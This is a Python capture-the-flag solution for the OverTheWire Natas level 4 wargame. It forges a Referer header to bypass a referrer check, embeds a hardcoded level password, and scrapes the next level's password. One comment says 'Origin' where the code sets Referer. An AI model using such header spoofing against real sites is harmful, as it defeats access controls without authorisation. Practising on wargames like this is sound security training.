#!/usr/bin/python3

import requests
import re

level = 4
username = 'natas%s' % level
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://%s.natas.labs.overthewire.org/' % username

# Here you need to set the Origin HTTP header to natas5.natas.labs.overthewire.org
response = requests.get(url, auth=(username, password), headers={'Referer':'http://natas5.natas.labs.overthewire.org/'})

# That should do it - now print the password
password = re.findall('The password for natas%s is (.*)' % str(level+1), response.text)[0]
print(password)

